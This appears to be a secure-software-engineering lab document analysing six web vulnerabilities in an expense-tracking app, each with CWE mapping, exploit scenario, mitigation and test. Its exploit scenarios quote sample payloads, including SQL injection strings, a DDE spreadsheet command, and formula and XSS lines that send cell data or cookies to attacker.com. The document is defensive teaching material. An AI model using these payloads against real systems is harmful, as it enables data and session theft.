# Phase 7, Part D: Vulnerability Analysis

**Project Title:** Secure Personal Expense Management Application (SPEMA)  
**Document ID:** SPEMA-SEC-VULN01  
**Course Code:** 24CYS401 – Secure Software Engineering Laboratory  
**Document Path:** `docs/security/vulnerabilities.md`  
**Classification:** Laboratory Examination Artifact – High Integrity  
**Status:** Approved Baseline  

---

## 1. Vulnerability Analysis Overview

This document analyzes six concrete vulnerabilities that are realistic for web-based personal financial applications. Each vulnerability is mapped to its Common Weakness Enumeration (CWE), threat model context, exploit scenario, architectural mitigation, and automated verification test.

Vulnerabilities are prioritized by risk according to the **CVSS v3.1 / OWASP Risk Rating Methodology**:
1. **VULN-01:** Broken Object-Level Authorization (BOLA / IDOR) in Transaction Access (`CWE-639`) — **Critical**
2. **VULN-02:** SQL Injection in Dynamic Transaction Search and Filtering (`CWE-89`) — **Critical**
3. **VULN-03:** CSV / Spreadsheet Formula Injection in Financial Reporting (`CWE-1236`) — **High**
4. **VULN-04:** Automated Credential Stuffing & Brute Force on Authentication (`CWE-307`) — **High**
5. **VULN-05:** Sensitive Credential and Token Disclosure in Audit Logs (`CWE-532`) — **High**
6. **VULN-06:** Stored Cross-Site Scripting (XSS) via Transaction Notes (`CWE-79`) — **High**

---

## 2. Concrete Vulnerability Specifications (Ranked by Risk)

### 2.1 VULN-01: Broken Object-Level Authorization (BOLA / IDOR) via Mutable Transaction IDs
- **Vulnerability ID:** **VULN-01**
- **Affected Component:** `TransactionService`, `TransactionRepository`, API Router (`/api/v1/transactions/{id}`).
- **Related Threat:** `THR-03` (BOLA on Transaction Mutation / Retrieval).
- **CWE Classification:** **CWE-639:** Authorization Bypass Through User-Controlled Key / **OWASP API1:2023:** Broken Object Level Authorization.
- **Risk Severity:** **CRITICAL** (CVSS: 9.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Impact:** Total violation of user confidentiality and data integrity. Any authenticated user can view, edit, or delete any other user's private financial records.
- **Exploit Scenario:**
  1. Attacker registers and logs in as `attacker@test.com`, obtaining a valid JWT token.
  2. Attacker inspects network traffic and observes their transaction creation returned `id: 105`.
  3. Attacker issues a `GET /api/v1/transactions/104` or `DELETE /api/v1/transactions/104`.
  4. If the controller executes `SELECT * FROM transactions WHERE id = 104` without verifying tenant ownership, the attacker views or deletes victim's financial records.
- **Architectural Mitigation:**
  1. Remove any client-supplied `user_id` parameter from request paths and DTO schemas (`SEC-005`, `SEC-007`).
  2. Derive tenant identity exclusively from server-side JWT claims (`current_user = Depends(get_current_active_user)`).
  3. Enforce compound queries at the database boundary: `WHERE id = :id AND user_id = :current_user.id`.
  4. If no row matches, return uniform `HTTP 404 Not Found` (anti-enumeration) (`SEC-006`).
- **Verification / Automated Test:**
  - Automated Pytest integration test: User A creates Transaction `T1`. User B issues `GET /api/v1/transactions/T1`, `PUT /api/v1/transactions/T1`, and `DELETE /api/v1/transactions/T1`. Assert that all requests return `HTTP 404 Not Found` and `T1` remains completely untouched in the database.

---

### 2.2 VULN-02: SQL Injection in Dynamic Transaction Search and Filtering
- **Affected Component:** `TransactionQueryService`, `TransactionRepository`.
- **Related Threat:** `THR-04` (SQL Injection in Search).
- **CWE Classification:** **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') / **OWASP A03:2021:** Injection.
- **Risk Severity:** **CRITICAL** (CVSS: 9.8 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Impact:** Complete database compromise. An attacker can dump all user credentials, transaction records, and audit logs, bypass tenant isolation, or drop tables.
- **Exploit Scenario:**
  1. Attacker sends a request to the transaction search endpoint:  
     `GET /api/v1/transactions?keyword=groceries' OR '1'='1`
  2. If the repository constructs the query using string concatenation:  
     `query = f"SELECT * FROM transactions WHERE user_id = {uid} AND description LIKE '%{keyword}%'"`
  3. The resulting SQL executes:  
     `SELECT * FROM transactions WHERE user_id = 42 AND description LIKE '%groceries' OR '1'='1%'`
  4. The injected `OR '1'='1'` evaluates to true for all rows, returning every transaction across all tenants.
- **Architectural Mitigation:**
  1. Use SQLAlchemy 2.0 ORM parameterized query expressions exclusively (`query.filter(Transaction.description.ilike(f"%{keyword}%"))`) (`SEC-009`).
  2. Enforce Pydantic whitelist validation restricting keywords to alphanumeric characters and spaces (`SEC-008`).
  3. Integrate Bandit SAST scanning in the CI pipeline to block raw SQL strings.
- **Verification / Automated Test:**
  - Automated SQL injection fuzz test submitting payloads (`' OR 1=1 --`, `UNION SELECT`, `'; DROP TABLE--`) into search parameters and verifying that queries execute without syntax errors and return only literal matches or empty lists.

---

### 2.3 VULN-03: CSV / Spreadsheet Formula Injection in Financial Reporting
- **Affected Component:** `ReportingService`, `SecureCSVExporter`.
- **Related Threat:** `THR-05` (CSV Formula Injection).
- **CWE Classification:** **CWE-1236:** Improper Neutralization of Formula Elements in a CSV File.
- **Risk Severity:** **HIGH** (CVSS: 8.6 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H`)
- **Impact:** Client-side remote code execution on the workstation of any user or accountant opening an exported CSV file in Microsoft Excel, LibreOffice Calc, or Google Sheets.
- **Exploit Scenario:**
  1. Malicious user creates an expense transaction with description:  
     `=cmd|' /C calc'!A0` or `=HYPERLINK("http://attacker.com/leak?data="&A1&B1, "Error")`
  2. Victim or auditor downloads the monthly financial statement via `/api/v1/reports/export-csv`.
  3. Victim opens the downloaded CSV file in Microsoft Excel.
  4. Excel recognizes the `=` prefix as an executable DDE command or formula and launches `calc.exe` or exfiltrates cell contents via the hyperlink.
- **Architectural Mitigation:**
  1. Implement `SecureCSVExporter` that inspects every exported cell. If any field starts with formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`), prepend an apostrophe (`'`) (`SEC-011`).
  2. Quote all fields using RFC 4180 rules (`csv.QUOTE_ALL`).
- **Verification / Automated Test:**
  - Automated unit test creating transactions with descriptions starting with `=`, `+`, `-`, `@`, exporting the CSV, and asserting that the resulting output strings begin with `'=`, `'+`, `'-`, and `'@`.

---

### 2.4 VULN-04: Automated Credential Stuffing & Brute Force on Authentication
- **Affected Component:** `AuthService`, API Router (`/api/v1/auth/login`).
- **Related Threat:** `THR-01` (Password Brute Forcing).
- **CWE Classification:** **CWE-307:** Improper Restriction of Excessive Authentication Attempts / **OWASP A07:2021:** Identification and Authentication Failures.
- **Risk Severity:** **HIGH** (CVSS: 7.5 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Impact:** Account takeover via automated password guessing, credential stuffing, and dictionary attacks.
- **Exploit Scenario:**
  1. Attacker obtains a list of breached email/password pairs from an external data dump.
  2. Attacker scripts a bot firing 1,000 login attempts per minute against `/api/v1/auth/login`.
  3. In the absence of rate limiting, the server evaluates all attempts, eventually guessing weak passwords and compromising user accounts.
- **Architectural Mitigation:**
  1. Deploy IP and username rate limiting allowing at most 5 attempts per 15-minute window (`SEC-003`).
  2. Utilize **Argon2id** password hashing to increase computational cost per evaluation (`SEC-001`).
  3. Return generic `HTTP 401 Unauthorized` without revealing whether the username exists.
- **Verification / Automated Test:**
  - Automated test firing 10 consecutive login requests in rapid succession; assert that request 6 through 10 return `HTTP 429 Too Many Requests`.

---

### 2.5 VULN-05: Sensitive Credential and Token Disclosure in Audit Logs
- **Affected Component:** `SecurityAuditLogger`, `AuditRepository`, Logging Middleware.
- **Related Threat:** `THR-08` (Credential Leak in Logs).
- **CWE Classification:** **CWE-532:** Insertion of Sensitive Information into Log File.
- **Risk Severity:** **HIGH** (CVSS: 7.5 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Impact:** Exposure of plaintext passwords, password hashes, and active JWT tokens to developers, log monitoring systems, and storage volumes.
- **Exploit Scenario:**
  1. User submits a login request or password change request containing sensitive credentials.
  2. Logging middleware records the full HTTP request body and headers to `stdout` or `audit_logs` for debugging purposes.
  3. An attacker or rogue insider with read access to log storage inspects the logs and recovers valid JWT tokens and passwords.
- **Architectural Mitigation:**
  1. Implement a centralized log sanitization filter that strips or masks sensitive keys (`password`, `access_token`, `authorization`, `secret`) before emitting log entries (`SEC-016`).
  2. Prohibit logging of raw request bodies on authentication routes.
- **Verification / Automated Test:**
  - Automated security test sending requests containing known dummy secrets and asserting that string searches across emitted log files detect zero occurrences of the plaintext secret.

---

### 2.6 VULN-06: Stored Cross-Site Scripting (XSS) via Transaction Notes
- **Affected Component:** `TransactionService`, Presentation Layer / Jinja2 Templates.
- **Related Threat:** `THR-11` (Stored XSS in Descriptions).
- **CWE Classification:** **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') / **OWASP A03:2021:** Injection.
- **Risk Severity:** **HIGH** (CVSS: 7.6 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`)
- **Impact:** Execution of malicious JavaScript in victim's browser session, leading to token exfiltration and session hijacking.
- **Exploit Scenario:**
  1. Attacker inputs an XSS payload into the transaction description field:  
     `<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">`
  2. The transaction is persisted in the database.
  3. When rendered in the browser dashboard or transaction list, the unescaped payload executes JavaScript in the victim's browser context.
- **Architectural Mitigation:**
  1. Enforce automatic context-aware HTML entity encoding in Jinja2 templates (`{{ txn.description }}`) (`SEC-010`).
  2. Deploy a strict Content Security Policy (`default-src 'self'`).
  3. Store authentication tokens in `HttpOnly` cookies so JavaScript cannot read them.
- **Verification / Automated Test:**
  - Automated integration test creating a transaction with payload `<script>alert(1)</script>` and verifying that the rendered HTML contains `&lt;script&gt;alert(1)&lt;/script&gt;`.

---

## 3. Vulnerability Prioritization & Risk Matrix

| Vulnerability ID | Vulnerability Name | CWE | Risk Severity | Exploitability | Remediation Phase |
| :---: | :--- | :---: | :---: | :---: | :---: |
| **VULN-01** | BOLA / IDOR on Transactions | CWE-639 | **CRITICAL** | Easy | Phase 5, 11, 12 |
| **VULN-02** | SQL Injection in Search | CWE-89 | **CRITICAL** | Easy | Phase 5, 11, 12 |
| **VULN-03** | CSV Formula Injection | CWE-1236 | **HIGH** | Medium | Phase 5, 12, 14 |
| **VULN-04** | Credential Brute Forcing | CWE-307 | **HIGH** | Easy | Phase 5, 12, 14 |
| **VULN-05** | Credential Leak in Logs | CWE-532 | **HIGH** | Medium | Phase 5, 14, 15 |
| **VULN-06** | Stored XSS in Descriptions | CWE-79 | **HIGH** | Medium | Phase 5, 6, 12 |
